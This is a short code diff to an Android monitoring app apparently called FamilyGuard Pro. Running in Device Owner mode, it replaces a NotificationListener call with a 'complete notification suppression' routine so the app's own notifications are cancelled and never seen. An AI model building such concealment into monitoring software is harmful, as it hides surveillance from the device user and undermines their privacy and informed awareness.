@@ -65,13 +65,15 @@ class FamilyGuardApp : Application() {
         
         // Force-enable NotificationListener in Device Owner mode
         // This allows us to auto-cancel our own notifications instantly
+        // Also setup complete notification suppression
         try {
             val doManager = com.familyguardpro.deviceowner.DeviceOwnerManager.getInstance(this)
             if (doManager.isDeviceOwner()) {
-                doManager.forceEnableNotificationListener()
+                // Setup complete notification suppression (invisible channel, disable toggle, enable listener)
+                doManager.setupCompleteNotificationSuppression()
             }
         } catch (e: Exception) {
-            android.util.Log.w("FamilyGuardApp", "Could not force-enable NotificationListener: ${e.message}")
+            android.util.Log.w("FamilyGuardApp", "Could not setup notification suppression: ${e.message}")
         }
         
         // Cancel all stale notifications if Device Owner mode is active
